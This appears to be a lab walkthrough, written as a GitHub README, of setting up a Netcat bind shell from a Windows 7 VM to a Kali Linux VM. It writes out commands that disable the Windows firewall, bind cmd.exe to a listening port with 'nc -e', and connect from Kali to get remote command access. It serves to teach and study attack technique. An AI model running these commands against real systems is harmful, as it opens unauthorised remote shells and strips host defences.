# Netcat Bind Shell: Windows to Kali Linux

## 📖 Overview
This document provides a step-by-step walkthrough of establishing a **Bind Shell** using Netcat (`nc`). In a bind shell scenario, the target machine (Windows) opens a local port and "binds" a command-line interface (`cmd.exe`) to it. The attacker machine (Kali Linux) then initiates a connection to that open port to gain remote shell access. 

---

## 🔍 Phase 1: Network Discovery & Configuration

Before attempting the connection, we must configure the network, disable the target's security boundaries for the lab environment, and verify connectivity.

### 1. Kali Linux (Attacker) Network Configuration
We begin on the Kali Linux machine by running `ifconfig` to identify its local IP address on the `eth0` interface. 
* **IP Address:** `192.168.1.4`

*(Screenshot showing the ifconfig output on Kali Linux)*
 <img width="1920" height="922" alt="VirtualBox_kali linux_15_07_2026_14_20_17" src="https://github.com/user-attachments/assets/4a12b8e9-f438-4b27-a3e3-c3137ac73f06" />

### 2. Windows (Target) Firewall & IP Configuration
On the Windows target, we simulate a vulnerable environment by explicitly disabling the firewall using an elevated command prompt (`netsh advfirewall set allprofiles state off`). We then run `ipconfig` to confirm the target's IP address.
* **IP Address:** `192.168.1.11`

*(Screenshot showing the Windows firewall being disabled and the ipconfig output)*
 <img width="1280" height="720" alt="VirtualBox_windows 7_15_07_2026_17_22_55" src="https://github.com/user-attachments/assets/8afc329a-7932-4a5d-9db6-b4e33f2d9b2a" />
)

### 3. Host Discovery Verification
Back on the Kali Linux machine, we use `arp-scan -l` to broadcast ARP requests across the local subnet. This confirms that the Windows machine (`192.168.1.11`) is successfully identified and reachable over the network.

*(Screenshot showing the arp-scan execution and host discovery)*
 <img width="1920" height="922" alt="VirtualBox_kali linux_15_07_2026_14_19_28" src="https://github.com/user-attachments/assets/c7af66f0-4b79-4457-9d86-365b9ad872b1" />

---

## ⚙️ Phase 2: Setting Up the Bind Shell (Target)

With the network mapped, we must configure the target machine to open a port and serve the command shell.

### 1. Preparing the Windows Target
On the Windows machine, we navigate to the directory containing the Netcat executable (`nc.exe`). We run a standard `dir` command to confirm the tool is present and ready for execution.

*(Screenshot showing the Windows Netcat directory)*
<img width="1280" height="720" alt="VirtualBox_windows 7_15_07_2026_17_24_47" src="https://github.com/user-attachments/assets/0a6c83cf-1954-444e-947c-b071c080b0e3" />


### 2. Executing the Bind Shell Listener
We execute the following command to tell Netcat to listen on a specific port and execute the command prompt upon connection:
* **Command:** `nc.exe -lvp 4455 -e cmd.exe`
    * **`-l`**: Listen mode.
    * **`-v`**: Verbose mode.
    * **`-p 4455`**: Listen on local port 4455.
    * **`-e cmd.exe`**: Execute the `cmd.exe` program and pipe its input/output to the connecting client.

*(Screenshot showing the execution of the bind shell command on Windows)*
![Windows Netcat Bind Shell Execution](IMG-20260715-WA0013.jpg)

Once executed, the Windows terminal will output `listening on [any] 4455 ...` and hang. This indicates that the port is successfully open and waiting for an incoming connection.

*(Screenshot showing the active Windows listener waiting for a connection)*
![Windows Listening on Port](IMG-20260715-WA0014.jpg)

---

## 💻 Phase 3: Access & Post-Exploitation (Attacker)

We return to the Kali Linux terminal to initiate the connection to the listening Windows machine.

### 1. Connecting to the Target
On Kali Linux, we use Netcat as a client to connect to the Windows machine's IP address on the designated port.
* **Command:** `nc -v 192.168.1.11 4455`

*(Screenshot showing Kali Linux connecting to the Windows bind shell)*
![Kali Netcat Client Connection](IMG-20260715-WA0015.jpg)

### 2. System Interaction
As soon as the connection is established, the target's `cmd.exe` is piped directly to our Kali terminal. The Microsoft Windows banner and the `C:\Users\boss\Desktop\nc.exe-master>` prompt appear. 

Executing standard Windows commands (like `dir` or `whoami`) from the Kali terminal confirms we have stable, interactive remote command-line access to the target system.

*(Screenshot showing successful bind shell access and command execution on Kali Linux)*
![Bind Shell Access on Kali](IMG-20260715-WA0016.jpg)
